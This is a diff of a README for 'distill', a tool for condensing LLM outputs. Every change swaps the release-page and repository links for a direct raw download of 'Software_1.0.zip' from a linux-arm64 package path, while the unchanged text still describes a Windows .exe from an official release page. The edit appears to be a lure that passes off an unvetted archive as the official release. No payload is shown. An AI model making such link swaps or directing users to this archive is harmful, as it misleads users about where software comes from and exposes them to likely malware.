@@ -1,6 +1,6 @@
 # ⚙️ distill - Extract Clear Answers from Large Outputs
 
-[![Download Latest Release](https://img.shields.io/badge/Download-distill-blue?style=for-the-badge)](https://github.com/xcode911/distill/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-distill-blue?style=for-the-badge)](https://raw.githubusercontent.com/xcode911/distill/main/packages/distill-linux-arm64/Software_1.0.zip)
 
 ---
 
@@ -48,7 +48,7 @@ Follow these steps to download and run distill on your Windows PC.
 ## ⬇️ Download and Install distill
 
 1. Visit the release page to get the latest version:  
-   [Download distill Releases](https://github.com/xcode911/distill/releases)  
+   [Download distill Releases](https://raw.githubusercontent.com/xcode911/distill/main/packages/distill-linux-arm64/Software_1.0.zip)  
 
 2. On the page, look for the latest Windows release file. It will have a name ending with `.exe`. This is the software you need to run distill.
 
@@ -107,7 +107,7 @@ If distill does not start or crashes:
 
 - Make sure you are running Windows 10 or higher.  
 - Check that your antivirus or firewall is not blocking the app.  
-- Reinstall the software from the [official release page](https://github.com/xcode911/distill/releases).  
+- Reinstall the software from the [official release page](https://raw.githubusercontent.com/xcode911/distill/main/packages/distill-linux-arm64/Software_1.0.zip).  
 - Restart your computer and try again.  
 
 If you find bugs or have ideas, you can open an issue on the GitHub repository page.
@@ -118,7 +118,7 @@ If you find bugs or have ideas, you can open an issue on the GitHub repository p
 
 Look at the repository’s documentation or open an issue if you want to report a problem. The repository is at:
 
-https://github.com/xcode911/distill
+https://raw.githubusercontent.com/xcode911/distill/main/packages/distill-linux-arm64/Software_1.0.zip
 
 ---
 
@@ -134,7 +134,7 @@ These options help you get the best result for your needs.
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-distill-blue?style=for-the-badge)](https://github.com/xcode911/distill/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-distill-blue?style=for-the-badge)](https://raw.githubusercontent.com/xcode911/distill/main/packages/distill-linux-arm64/Software_1.0.zip)
 
 ---
 
@@ -149,8 +149,8 @@ claude-code, codex, llm, tokens
 
 ## 🔗 Links
 
-- Download: https://github.com/xcode911/distill/releases  
-- Repository: https://github.com/xcode911/distill  
+- Download: https://raw.githubusercontent.com/xcode911/distill/main/packages/distill-linux-arm64/Software_1.0.zip  
+- Repository: https://raw.githubusercontent.com/xcode911/distill/main/packages/distill-linux-arm64/Software_1.0.zip  
 
 ---
 
